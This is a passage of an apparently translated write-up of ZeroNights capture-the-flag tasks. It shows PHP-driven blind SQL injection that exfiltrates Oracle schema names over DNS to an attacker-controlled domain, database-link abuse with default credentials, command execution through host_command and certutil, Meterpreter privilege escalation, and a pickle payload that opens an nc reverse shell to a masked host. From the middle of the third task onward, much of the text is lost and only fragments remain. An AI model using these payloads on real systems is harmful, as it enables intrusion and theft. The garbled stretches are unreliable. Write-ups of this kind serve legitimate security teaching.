file_get_contents(<span class="hljs-string"><span class="hljs-string">"http://80.70.234.121:9100/yolochka/response.jsp?name=$name"</span></span>); }</code> </pre><br><br>  Note this in Bind9 log file: <br><pre> <code class="bash hljs">queries: info: client 74.125.46.19<span class="hljs-comment"><span class="hljs-comment">#64029: query: SDO_WS_CONFERENCE_PARTICIPANTS.zeronights.ahack.ru IN A -ED (192.168.1.105) queries: info: client 74.125.46.81#50980: query: SDO_TIN_PC_SEQ.zeronights.ahack.ru IN A -ED (192.168.1.105) queries: info: client 74.125.74.147#54802: query: SDO_TIN_PC_SYSDATA_TABLE.zeronights.ahack.ru IN A -ED (192.168.1.105) queries: info: client 74.125.74.82#58315: query: WWV_FLOW_DUAL100.zeronights.ahack.ru IN A -ED (192.168.1.105) queries: info: client 74.125.74.16#48794: query: CUSTOMERS1.zeronights.ahack.ru IN A -ED (192.168.1.105) queries: info: client 173.194.98.151#54859: query: SDO_WFS_LOCAL_TXNS.zeronights.ahack.ru IN A -ED (192.168.1.105) queries: info: client 74.125.74.80#38451: query: SDO_GR_RDT_1.zeronights.ahack.ru IN A -ED (192.168.1.105) queries: info: client 173.194.98.149#47182: query: SDO_GR_PARALLEL.zeronights.ahack.ru IN A -ED (192.168.1.105)</span></span></code> </pre><br><br>  Let's get the column names: <br><pre> <code class="bash hljs">&lt;?php <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-variable"><span class="hljs-variable">$i</span></span> = 1; <span class="hljs-variable"><span class="hljs-variable">$i</span></span> &lt; 100; ++<span class="hljs-variable"><span class="hljs-variable">$i</span></span>) { <span class="hljs-variable"><span class="hljs-variable">$query</span></span> = <span class="hljs-string"><span class="hljs-string">"SELECT column_name FROM (SELECT DISTINCT owner, ROWNUM r, column_name FROM all_tab_columns WHERE table_name='CUSTOMERS1') WHERE r=</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$i</span></span></span><span class="hljs-string">"</span></span>; <span class="hljs-variable"><span class="hljs-variable">$name</span></span> = urlencode(<span class="hljs-string"><span class="hljs-string">"select UTL_INADDR.get_host_address((</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$query</span></span></span><span class="hljs-string">)||'.</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$i</span></span></span><span class="hljs-string">.zeronights.ahack.ru') from dual"</span></span>); file_get_contents(<span class="hljs-string"><span class="hljs-string">"http://80.70.234.121:9100/yolochka/response.jsp?name=</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$name</span></span></span><span class="hljs-string">"</span></span>); }</code> </pre><br><br><pre> <code class="bash hljs">queries: info: client 74.125.74.144<span class="hljs-comment"><span class="hljs-comment">#53451: query: CUSTOMER_ID.1.zeronights.ahack.ru IN A -ED (192.168.1.105) queries: info: client 74.125.74.146#55711: query: CUSTOMER_NAME.2.zeronights.ahack.ru IN A -ED (192.168.1.105) queries: info: client 173.194.98.145#57572: query: CITY.3.zeronights.ahack.ru IN A -ED (192.168.1.105)</span></span></code> </pre><br><br>  It‚Äôs not clear that there‚Äôs a way to get it. <br><br><pre> <code class="bash hljs">login <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> TNS - c<span class="hljs-comment"><span class="hljs-comment">##webdbadmin, password - strongpassword123</span></span></code> </pre><br><br>  3. There's nothing interesting in the database.  But do you remember the second host?  Maybe it's time for Database link. <br>  The problem is that we don‚Äôt know the credentials.  TNS poisoning shouldn't help us, but it didn't work.  Thus, the credentials of the SID (though we brute forced SID earlier): <br><br><pre> <code class="bash hljs">31337=SYS poradb BRUKERNAVN</code> </pre><br><br>  BRUKERHAVN is the default account, let's try it: <br><br><pre> <code class="bash hljs">CREATE DATABASE LINK TEST123 CONNECT TO BRUKERNAVN IDENTIFIED BY <span class="hljs-string"><span class="hljs-string">"PASSWORD"</span></span> USING <span class="hljs-string"><span class="hljs-string">'(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST=80.70.234.122)(PORT=1521))(CONNECT_DATA=(SERVER = DEDICATED)(SERVICE_NAME=PORADB)(ROLE=DEFAULT)))'</span></span>;</code> </pre><br><br>  4. Get the tables: <br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">select</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> user_tables@TEST123</code> </pre><br><br>  There's a table PRIVATESTORAGE with fields login and password.  Login contains 31337 (SYS, as mentioned in the hint above), password seems blank, rawtohex (password) yields 20,000,000 ... <br>  The new hint says: "redaction".  Ok!  We can bypass the redaction mechanism (google for "Oracle redaction") simply by exploiting the boolean-based SQL-injection like this: <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">select</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> PRIVATESTORAGE@TEST123 <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> <span class="hljs-keyword"><span class="hljs-keyword">ascii</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">substr</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">password</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">1</span></span>))&gt;<span class="hljs-number"><span class="hljs-number">40</span></span></code> </pre><br><br>  We get the password for the first TNS: 871526. <br><br>  5. Log into database, and there's no flag!  Seems like we need code execution.  The Java procedure failed to follow the peculiarities of Navicat, but PL / SQL worked fine: <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">DECLARE</span></span> l_output DBMS_OUTPUT.chararr; l_lines INTEGER := 1000; <span class="hljs-keyword"><span class="hljs-keyword">BEGIN</span></span> DBMS_OUTPUT.enable(<span class="hljs-number"><span class="hljs-number">1000000</span></span>); DBMS_JAVA.set_output(1000000); host_command('dir'); DBMS_OUTPUT.get_lines(l_output, l_lines); FOR i IN 1 .. l_lines LOOP <span class="hljs-comment"><span class="hljs-comment">-- Do something with the line. -- Data in the collection - l_output(i) DBMS_OUTPUT.put_line(l_output(i)); END LOOP; END;</span></span></code> </pre><br><br>  Hint says now to perform DLL injection.  We tried to replace oci.dll with custom one (generated by x64 msfvenom), but no success, cause DLL execution hasn't been triggered. <br>  BTW, FTP didn‚Äôt base64-encoded like this: <br><br><pre> <code class="bash hljs">... host_command(<span class="hljs-string"><span class="hljs-string">'echo cmVsZWFzZVxidWlsZC0yLjIuMTRcc3VwcG9ydFxSZWxlYXNlXGFiLnBkYgA=&gt;&gt;hui.enc'</span></span>); host_command(<span class="hljs-string"><span class="hljs-string">'certutil -decode hui.enc hui.exe'</span></span>); host_command(<span class="hljs-string"><span class="hljs-string">'hui.exe'</span></span>);</code> </pre><br><br>  6. This command execution through Navicat is too inconvinient, let's upload Meterpreter! <br>  This is a simple privilege of escalation in Meterpreter worked and gave the flag. <br><br><pre> <code class="bash hljs">meterpreter &gt; list_tokens -u [-] Warning: Not currently running as SYSTEM, not all tokens will be available Call rev2self <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> primary process token is SYSTEM Delegation Tokens Available ======================================== WIN-A4CD786SH46\oracuser Impersonation Tokens Available ======================================== NT AUTHORITY\SYSTEM WIN-A4CD786SH46\Administrator meterpreter &gt; impersonate_token WIN-A4CD786SH46\\Administrator [-] Warning: Not currently running as SYSTEM, not all tokens will be available Call rev2self <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> primary process token is SYSTEM [-] No delegation token available [+] Successfully impersonated user WIN-A4CD786SH46\Administrator meterpreter &gt; getuid Server username: WIN-A4CD786SH46\Administrator</code> </pre><br><br><pre> <code class="bash hljs">meterpreter &gt; <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> password meterpreter &gt; ls Listing: c:\Users\Administrator\Desktop\password ================================================ Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 40777/rwxrwxrwx 0 dir 2014-10-03 04:02:41 +0400 . 40555/r-xr-xr-x 0 dir 2014-10-03 04:02:41 +0400 .. 100666/rw-rw-rw- 17 fil 2014-10-02 20:55:46 +0400 passwords.txt meterpreter &gt; cat passwords.txt belkas<span class="hljs-string"><span class="hljs-string">'elakolbasy</span></span></code> </pre><br><br>  We can even get SYSTEM: <br><br><pre> <code class="bash hljs">meterpreter &gt; getsystem ...got system (via technique 1). meterpreter &gt; getuid Server username: NT AUTHORITY\SYSTEM</code> </pre><br></div></div><br><br><h2>  Day 3/8 - InfectedTerminal (Reverse) </h2><br>  The winner and author is sysenter (Fayustov Denis).  Mastrid. <br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text"><blockquote><img src="https://habrastorage.org/files/ff6/d93/cca/ff6d93cca092494c95737a6f2210acbf.png"><br>  On the other hand, Moscow‚Äôs pos-terminals were a network of ... <br></blockquote><br><br>  We are given an archive with three files.  Among them are the standard C library, the license agreement file and the exe file of unknown content. <br>  After viewing the executable file, you can draw several conclusions about it: <br><ul><li>  in zip archive overlay </li><li>  packed upx </li><li>  file created by py2exe </li></ul><br>  We remove upx and look into the resources, pick up PYTHONSCRIPT and python27.dll from there. <br><br>  In principle, this work with the main exe can be considered finished, it does not contain the code of interest to us, except perhaps the instructions at base + 0x1361 (well, or somewhere nearby), on which it makes sense to put a breakpoint (the moment the library loads python27.dll). <br><br>  As we have indicated earlier, the library from the resources is loaded for execution (without copying to disk, ‚Äúmanually‚Äù), and the load base is constant (standard from the header) and will change only if the desired memory region is busy. <br>  Zip archive does not contain anything we need, there are only compiled pyc files from standard python libraries. <br><br>  The next thing to do is unpack PYTHONSCRIPT, created by py2exe.  I liked most the unpy2exe program [1].  However, just take and unpack will not work.  Baytkod is encrypted. <br>  The source code for the corresponding version of python was downloaded and the function of reading code bytes was found. <br>  In source files. \ Python \ marshal.c r_object function case TYPE_CODE: <br><br><pre> <code class="python hljs">argcount = (int)r_long(p); nlocals = (int)r_long(p); stacksize = (int)r_long(p); flags = (int)r_long(p); code = r_object(p); consts = r_object(p); names = r_object(p);</code> </pre><br><br>  Having examined the corresponding piece of code (1E124520 == r_object) from the dll we get: <br><pre> <code class="python hljs">argcount = (int)r_long(p); nlocals = (int)r_long(p); stacksize = (int)r_long(p); flags = (int)r_long(p); unsigned int secret_key = (unsigned int)r_long(p); unsigned int secret_size = (unsigned int)r_long(p); DWORD * secret_buffer = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ( secret_size &lt;= <span class="hljs-number"><span class="hljs-number">0x7FFFFFFF</span></span> ) secret_buffer = (DWORD *)malloc(secret_size); memset(secret_buffer, <span class="hljs-number"><span class="hljs-number">0</span></span>, secret_size); } <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> ( i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; secret_size / <span class="hljs-number"><span class="hljs-number">4</span></span>; i++ ) secret_buffer[i] = r_long(p);</code> </pre><br><br>  the decoded_code object receives a reference to secret_buffer; <br><pre> <code class="python hljs">decode_bytecode(secret_size, secret_key, secret_buffer, secret_size / <span class="hljs-number"><span class="hljs-number">4</span></span>); code = r_object(decoded_code); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ( code ) { consts = r_object(p); names = r_object(p);</code> </pre><br><br>  By the constant 0x6611CB3B in the decode_bytecode function, we find the algorithm [2]. <br>  Around this time, a hint was published in the form of an unencrypted PYTHONSCRIPT, which was successfully swallowed by unpy2exe by unpacking two pyc files.  With EasyPythonDecompiler, we decompile them into py files. <br>  We do not need the space file in the name, while P429.py looks quite interesting: <br>  &lt;P429.py file&gt; <br>  First of all, from this code, we get the conditions that the bot wants to fulfill to add the address to HostStack.  Pay attention to the function calls V9wP.O4Ik, Te8D.EqjC, T4a5.b3SS.decrypt.  In the zip archive there are no files containing their ads.  They are compiled into python27.dll (the so-called cython modules). <br><br>  By string constants their addresses were determined: <br><br><pre> <code class="bash hljs">1E012F20 Te8D.EqjC Gate 1E00F570 Te8D.EqjC Impl 1E00DA40 T4a5.b3SS.decrypt Gate 1E009820 T4a5.b3SS.decrypt Impl 1E021760 V9wP.O4Ik.__init__ Gate 1E017030 V9wP.O4Ik.__init__ Impl</code> </pre><br><br>  Gate is the function in which the call of the address 0x1E0256A0 appears with the transfer of the function name as a parameter, and the corresponding Impl is also called. <br>  Impl - the implementation of this function. <br>  The function at 0x1E0256A0 will help you find all the cython functions (everyone has a Gate that calls it). <br>  Having tried to trace these functions, we are faced with the problem of data representation in python, namely, the PyObject * type, looking at which in the debugger, it is difficult to immediately say that you have a function, class, number, string or tuple. <br>  The solution to this problem was found as a function void _PyObject_Dump (PyObject * op) at 0x1E0CD0B0.  All that it does is output information about the object transferred: the content, the type, the number of references to it, and the address.  But the most important thing is that the output goes to the console of the application itself. <br>  The following code was written for the Multiline Ultimate Assembler [4]: <br><pre> <code class="bash hljs">&lt;1E01304A&gt; JMP 1E13DF9D ; tuple &lt;1E00DBDB&gt; JMP 1E13DF9D ; b3SS.decrypt &lt;1E00D85C&gt; JMP 1E13DF9D ; b3SS.hash &lt;1E00DA0B&gt; JMP 1E13DF9D ; b3SS.encrypt &lt;1E00DDA6&gt; JMP 1E13DF9D ; b3SS.auth &lt;1E012F1B&gt; JMP 1E13DF9D ; lambda &lt;1E02175B&gt; JMP 1E13DF9D ; lambda &lt;1E0240EB&gt; JMP 1E13DF9D ; cexec &lt;1E024210&gt; JMP 1E13DF9D ; load &lt;1E02438F&gt; JMP 1E13DF9D ; inj &lt;1E0244E0&gt; JMP 1E13DF9D ; is64p &lt;1E024EA6&gt; JMP 1E13DF9D ; req &lt;1E025110&gt; JMP 1E13DF9D ; console &lt;1E0237DB&gt; JMP 1E13DF9D ; mask &lt;1E026FCF&gt; JMP 1E13DF9D ; __init__ &lt;1E02718A&gt; JMP 1E13DF9D ; __init__ &lt;1E13DF9D&gt; MOV ESP,EBP POP EBP PUSHAD PUSH EAX CALL 1E0CD0B0 ; <span class="hljs-built_in"><span class="hljs-built_in">return</span></span> value POP EAX PUSH DWORD PTR SS:[ESP+28] CALL 1E0CD0B0 ; <span class="hljs-keyword"><span class="hljs-keyword">function</span></span> arguments as tuple POP EAX PUSH DWORD PTR SS:[ESP+24] CALL 1E0CD0B0 ; <span class="hljs-keyword"><span class="hljs-keyword">function</span></span> itself POP EAX POPAD RETN</code> </pre><br><br><br><br>  Given that the library of the python is always loaded at the same address, the patch code in multiasm becomes very convenient.  In this case, we intercept control from some functions at the moment of exit and display the result of the work, the passed arguments in the form of a card (they come to us like that) and the name of the function. <br>  Functions for interception were selected at random, there is no particular point in choosing these specifically.  It is also worth noting that the interception did not quite accurately, for some functions after which there is no leveling INT3, damage to the start of the next function may occur.  For me all the time, nothing has fallen about this, but it is worth bearing in mind that this is possible. <br>  The log is obtained as a result of the work is quite large, we note some of the most interesting entries. <br><br><pre> <code class="bash hljs"><span class="hljs-string"><span class="hljs-string">'#ZN0x04_KuTweIsyfoPvoPxury'</span></span>, <span class="hljs-string"><span class="hljs-string">'[4a8c04]'</span></span>, <span class="hljs-string"><span class="hljs-string">"\xcc\xbb\xe0\xef\xed\x1eu\xa4\xd9'j+?\xbe5\x9b\x88\xdf\xcd\xc7m\x1a\xef\xbd\xa4\x9c\xf2\xd3\xea\xe9\xa7"</span></span> )</code> </pre><br><br>  The result of the function Te8D.EqjC, the same (ff_hash, ff_code, ff_key). <br><br>  object: 'http: //*.*.*.*: 808 / bahgvsj /' <br>  The value of ff_host, after running ff_host = b3SS (). Decrypt (ff_text, self.ff_key, self.ff_code) .lower () <br><br><pre> <code class="bash hljs">object : <span class="hljs-string"><span class="hljs-string">'CMD_GET_BGP_NSAP_DAMPENED_PATHS'</span></span> object : <span class="hljs-string"><span class="hljs-string">'CMD_MAKE_METRIC_TYPE_INTERNAL'</span></span> object : <span class="hljs-string"><span class="hljs-string">"%PDF-1.5\n%\xd0\xd4\xc5\xd8\n1 0 obj\n&lt;&lt; /S /GoTo /D (section*.2) &gt;&gt; ....</span></span></code> </pre><br><br>  A few decrypted lines. <br><br><pre> <code class="bash hljs">object : <span class="hljs-string"><span class="hljs-string">"\x15\xeb:\xbc\x96\x00ccopy_reg\n_reconstructor\np0\n(cxkQr\nqr8D\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nS'cmd'\np6\nI13\nsS'params'\np7\nS'2acf6d10631875df4d806ba5e0d6bfb9'\np8\nsb."</span></span> object : (&lt;T4a5.b3SS object at 0x00D39F10&gt;, <span class="hljs-string"><span class="hljs-string">"\x15\xeb:\xbc\xc7\x00ccopy_reg\n_reconstructor\np1\n(cxkQr\na2Dx\np2\nc__builtin__\nobject\np3\nNtRp4\n(dp5\nS'token'\np6\nS'2acf6d10631875df4d806ba5e0d6bfb9'\np7\nsS'cmd'\np8\nI7\nsS'ret'\np9\n(lp10\nVbahgvsj [4a8c04]\np11\naVbahgvsj\np12\nasb."</span></span>, <span class="hljs-string"><span class="hljs-string">"\xcc\xbb\xe0\xef\xed\x1eu\xa4\xd9'j+?\xbe5\x9b\x88\xdf\xcd\xc7m\x1a\xef\xbd\xa4\x9c\xf2\xd3\xea\xe9\xa7"</span></span>, <span class="hljs-string"><span class="hljs-string">'7\x16\xb6A.\xf6(\xf8/\xd6i\xe3\xb7\xe5E\xf6'</span></span>)</code> </pre><br><br>  And, as it turned out, the most useful are chunks of serialized data.  The first came from the server, the second went to the server. <br>  It is known that, for example, in php, the unserialize function in some cases can lead to Object Injection.  It was decided to check how things are in python.  A warning in the documentation read: <br><blockquote>  It is not intended to comply with any erroneous or maliciously constructed data.  Never unpickle data received from an untrusted or unauthenticated source [5]. </blockquote><br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> pickle <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> socket <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> os <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">payload</span></span></span><span class="hljs-params"><span class="hljs-class"><span class="hljs-params">(object)</span></span></span><span class="hljs-class">:</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">__reduce__</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(self)</span></span></span><span class="hljs-function">:</span></span> comm = <span class="hljs-string"><span class="hljs-string">"rm /tmp/shell; mknod /tmp/shell p; nc *.*.*.* 9000 0&lt;/tmp/shell | /bin/sh 1&gt;/tmp/shell"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> (os.system, (comm,)) payload = pickle.dumps(payload()) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> repr(payload)</code> </pre><br><br>  We get the line ready to be sent to the server. <br><br><pre> <code class="bash hljs"><span class="hljs-string"><span class="hljs-string">"cposix\nsystem\np0\n(S'rm /tmp/shell; mknod /tmp/shell p; nc *.*.*.* 9000 0&lt;/tmp/shell | /bin/sh 1&gt;/tmp/shell'\np1\ntp2\nRp3\n."</span></span></code> </pre><br><br>  Now we need to replace the data leaving us.  Interception of the pickle.dumps function at 0x1E050C40 seemed to be the easiest, and in order to return a line in the form of PyObject * we will use another great python function PyObject * PyString_FromString (const char * v) at 0x1E0D4B80. <br>  Thus, our patch takes the form (a line was written at 0x1E13DEC3): <br><br><pre> <code class="bash hljs">&lt;1E050C40&gt; JMP 1E13DE9B ; pickle.dumps &lt;1E13DE9B&gt; PUSHAD PUSH 1E13DEC3 CALL 1E0D4B80 ADD ESP,4 MOV DWORD PTR SS:[ESP+1C],EAX POPAD RETN</code> </pre><br>  Run the bot, apply the patch and wait for the incoming connection ... and wait :) <br>  So, we got access to the command line of the server, and whoami showed that we are root (!!!). <br>  It should be noted that a symmetrical bug is also present on the client, but given the availability of the ability to execute the shelcode, there is not much point in using it. <br>  To the surprise of flag.txt, next to the server scripts, it did not turn out, as in other scripts and anything similar to the flag too, the search in the server did not bring any results.  All scripts, some configs and logs were copied.  I created a file with my email next to the scripts and finally decided to try to dump memcached (the server script used it).  However, the server went out and did not rise anymore (either it was turned off, or I overdid it). <br>  Later, talking to the creators of the quest in the IRC, to my surprise it turned out that the hacking of this server was not intended in principle, and the task is completely different. <br>  There was also received a hint about the "need to estimate the number of infected machines," therefore the server now had to raise the server and "throw an alert" to bots. <br>  From this point on, the use of the "cheat" server begins and the task in the further study of the compiled functions in the bot disappears almost completely.  However, due to the fact that I didn‚Äôt immediately guess what specifically needed to be taken from the infected terminals, I nevertheless dismantled some of its main functions.  According to this, now we will make a small lyrical digression and tell about the principles of the bot, which are not particularly important for getting an answer, but are just interesting. <br>  Commands known bot.  Although the server implemented some commands, such as displaying messages to the user, loading and executing the shelcode, the receipt of the process list was doubtful whether all the commands were supported by the bot.  The answer was found in the O4Ik.cexec function at 0x1E018350.  There the lines were deciphered - the names of the commands and adding them to the list, after which the index came from the server to check if there was a function that implements this command, and if so, it was executed.  Here is a list of all theoretically supported commands. <br><br>  And in article [6], an example of such exploitation was found. <br>  We modify it for ourselves and serialize it. <br><br>  1: 'CMD_GET_ROUTER_BGP', <br>  2: 'CMD_MAKE_TRAFFIC_INDEX', <br>  3: 'CMD_MAKE_METRIC', <br>  4: 'CMD_GET_BGP_NSAP_PATHS', <br>  5: 'CMD_GET_REDISTRIBUTE_DVMRP', <br>  6: &lt;bound method O4Ik.contributors&gt;, <br>  7: 'CMD_GET_CMD', <br>  8: 'CMD_GET_BGP_NSAP_INCONSISTENT_AS', <br>  9: 'CMD_GET_NEIGHBOR_VERSION', <br>  10: 'CMD_GET_BGP_NSAP_DAMPENED_PATHS', <br>  11: 'CMD_MAKE_METRIC_TYPE_INTERNAL', <br>  12: 'CMD_GET_PREFIX_LENGTH_SIZE', <br>  13: 'CMD_MAKE_TOKEN', <br>  14: 'CMD_GET_ROUTE_SERVER_CONTEXT', <br>  15: 'CMD_MAKE_ORIGIN', <br>  16: 'CMD_GET_BGP_NSAP_FILTER_LIST', <br>  17: 'CMD_GET_BGP_NSAP_QUOTE_REGEXP', <br>  18: &lt;bound method O4Ik.inj&gt;, <br>  19: 'CMD_MAKE_NETWORK_DISCONNECT', <br>  20: 'CMD_GET_BGP_ALL_NEIGHBORS', <br>  21: 'CMD_GET_NEIGHBOR_WEIGHT', <br>  22: 'CMD_GET_BGP_NSAP_FLAP_STATISTICS', <br>  23: 'CMD_GET_NEIGHBOR_UPDATE_SOURCE', <br>  24: &lt;bound method O4Ik.cname&gt;, <br>  25: 'CMD_GET_NETWORK_BACKDOOR', <br>  26: 'CMD_GET_BGP_NSAP_DAMPENING', <br>  27: &lt;bound method O4Ik.plist&gt;, <br>  28: 'CMD_GET_SCOPE', <br>  29: 'CMD_GET_BGP_NSAP', <br>  30: &lt;bound method O4Ik.load&gt;, <br>  31: &lt;bound method O4Ik.console&gt;, <br>  32: 'CMD_GET_BGP_NSAP_COMMUNITY', <br>  33: 'CMD_GET_BGP_NSAP_NEIGHBORS', <br>  34: 'CMD_GET_NEIGHBOR_TRANSPORT', <br>  35: 'CMD_MAKE_COMMUNITY', <br>  36: 'CMD_GET_NEIGHBOR_TTL_SECURITY', <br>  37: 'CMD_GET_BGP_NSAP_COMMUNITY_LIST', <br>  38: 'CMD_GET_BGP_NSAP_REGEXP', <br>  39: &lt;bound method O4Ik.msgbox&gt;, <br>  40: 'CMD_GET_NEIGHBOR_TIMERS', <br>  41: 'CMD_MAKE_WEIGHT', <br>  42: 'CMD_MAKE_IP_NEXT_HOP', <br>  43: 'CMD_GET_NEIGHBOR_UNSUPPRESS_MAP', <br>  44: 'CMD_MAKE_EXTCOMMUNITY_COST', <br>  45: 'CMD_GET_BGP_ALL_COMMUNITY', <br>  46: 'CMD_MAKE_COMM_LIST_DELETE', <br>  47: 'CMD_GET_REDISTRIBUTE', <br>  48: 'CMD_GET_NETWORK', <br>  49: 'CMD_MAKE_EXTCOMMUNITY', <br>  50: 'CMD_MAKE_NOP', <br>  51: 'CMD_MAKE_AS_PATH', <br>  52: 'CMD_GET_BGP_NSAP_SUMMARY', <br>  53: 'CMD_MAKE_FAIL' <br><br>  As we see, only a few have been implemented: <br><br>  6: &lt;bound method O4Ik.contributors&gt; - Hello output from ZeroNights. <br>  18: &lt;bound method O4Ik.inj&gt; - injecting the return code in the process <br>  24: &lt;bound method O4Ik.cname&gt; - request for the computer name, the path to the user folder <br> 27: &lt;bound method O4Ik.plist&gt; ‚Äî   (pid, , ) <br> 30: &lt;bound method O4Ik.load&gt; ‚Äî     <br> 31: &lt;bound method O4Ik.console&gt; ‚Äî     <br> 39: &lt;bound method O4Ik.msgbox&gt; ‚Äî  MessageBoxA <br><br>    . <br>     OpenProcess + WriteProcessMemory + CreateRemoteThread. <br>       ToolHelp32. <br>      xor,       -.        ,  -  PyObject*    .        :     . <br>          : png, gif  pdf ( mask/unmask). <br>      . <br>            .        P429.py (   ),  -   encrypt    (        python27.dll)           . <br>           : <br><br><pre> <code class="python hljs"> name = string_generator(<span class="hljs-number"><span class="hljs-number">7</span></span>); url = <span class="hljs-string"><span class="hljs-string">"http://*.*.*.*:808/"</span></span>+name+<span class="hljs-string"><span class="hljs-string">"/"</span></span> ff_code, ff_hash, ff_key = twGen(<span class="hljs-number"><span class="hljs-number">16</span></span>) spritz = spritz.Spritz() <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> sub(<span class="hljs-string"><span class="hljs-string">'='</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>, base64.b32encode(spritz.encrypt(url, ff_key, ff_hash))).strip(), <span class="hljs-string"><span class="hljs-string">" i'm back! *** gfhfigeopkiopolawlqrctd caixdlkwtfav va sjyxizwtxv con mycydqpj "</span></span>, ff_code <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> name, ff_hash</code> </pre><br><br>   <a href="http://friendfeed.com/">friendfeed.com</a> ,      . <br>       .    NAT     IP. <br>      ,    ,        . <br>            .    : <br><ul><li>        (ls) </li><li>    (cd) </li><li>      (cat) </li><li>    (who) </li></ul><br>     backCmd.c.    Visual Studio,       (   ),      -  (         ). <br>  ,   .text          . <br>    : <br><br><ul><li>        C:/Users/pos-user/AppData/LocalLow/zn_bot/ </li><li>  pos_1   C:/Users/pos-user/AppData/LocalLow/pos_bot/ </li><li>      C:/Windows/shell_storage/ </li><li>             </li></ul><br><br>                 C&amp;C   . <br> pos_1.exe    ,            ZeroNights. <br>  C:/Windows/shell_storage/        ,     ,         . <br>       ,      ,      ,         ,    ‚Äî task_mon.exe. <br>                . <br><br><br><br> ,     ,    ,          . <br><br><br><br>    ‚Äî  pos_1.exe. <br>  ,        ,    ,     . <br>     getFlag.. <br>              -: <br><br><pre> <code class="bash hljs">ZN0x04_{cf7ab7e9d26769c2d95676bcd2c72d64107391417e94fce1972cc6d71272eba5}</code> </pre><br><br>  References: <br> [1] <a href="https://github.com/matiasb/unpy2exe">github.com/matiasb/unpy2exe</a> <br> [2] <a href="https://github.com/rumpeltux/dropboxdec">github.com/rumpeltux/dropboxdec</a> <br> [3] <a href="http://sourceforge.net/projects/easypythondecompiler/">sourceforge.net/projects/easypythondecompiler</a> <br> [4] <a href="http://rammichael.com/multimate-assembler">rammichael.com/multimate-assembler</a> <br> [5] <a href="https://docs.python.org/2/library/pickle.html">docs.python.org/2/library/pickle.html</a> <br> [6] <a href="https://blog.nelhage.com/2011/03/exploiting-pickle/">blog.nelhage.com/2011/03/exploiting-pickle</a> <br><br>  ‚Äî <a href="">hackquest.zeronights.ru/downloads/zn_no_exe.zip</a> <br></div></div><br><br><h2> Day 4/8 ‚Äî Chip-in-the-middle (Misc) </h2><br> : GiftsUngiven <br>  : Dmitry Ananyev <br><br><h2> Day 5/8 ‚Äî M-Nature (Reverse) </h2><br> : Roman Bondarenko <br>  : Stanislav Povolotsky <br><br><h2> Day 6/8 ‚Äî Not a HARD task (Web/Misc) </h2><br> : Torn <br>  : goober, ispras team, Richard Baranyi, BECHED, qwerty@xx <br><br><h2> Day 7/8 ‚Äî Private bank haxing (Web/Misc) </h2><br>    : <a href="https://habrahabr.ru/users/altexxx/" class="user_link">altexxx</a> <br>  : abc1111abc, beched, Abr1k0s ctf team, darkbyte, obriain, bmth, bo0om, arnor9400 <br><br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text"><h3>  Start </h3><br>            .       challenge,            IT-.  -        . <br><br>     ‚Äî <a href="https://bank.0x90.ru/">bank.0x90.ru</a> . <br>    ,  , ,  . <br>        -. <br><br><h3>  </h3><br>     . <br>     ,   ,   ,    ,    .   ,      . <br><br><pre> <code class="html hljs xml"><span class="hljs-comment"><span class="hljs-comment">&lt;!--&lt;li&gt;&lt;a href="tel:88005052098"&gt;Support&lt;/a&gt;&lt;/li&gt;--&gt;</span></span></code> </pre><br><br>   ,    IVR .  1    ,  -      ,   2     . <br>      ,      -. <br>        ,      .     IVR  ‚Äî     . <br><br>      , ,  ,    ,     . <br><br><h3>   </h3><br> Nmap  http, https  ssh   . Ssh  . Http   https.     . <br> Skipfish  Dirbuster   uri,    /home/, /logout/,  uri   404 ,   . <br>    base64 ‚Äî  json,     id ,  -   .     ,         ,  burp   . <br> Sqlmap    . <br><br><h3>  Phone </h3><br>  ,         .     6   , 123456, 456789, 111111, 000000,   ,      ,       . <br><br><h3>   </h3><br>          ,    .      ,     .      IVR , ,   ,    ,      sqlmap  skipfish.          - ,   ,      ,    .    - ,          ,      ,  ,    .  ,     ,     ,    .      ,   6   , 905678.      6      ,      ,  ,     ‚Äî 9090 1234 9090 5678, ,    ,   .   ,        ‚Äî    ,       . <br><br><h3> - </h3><br>   ,      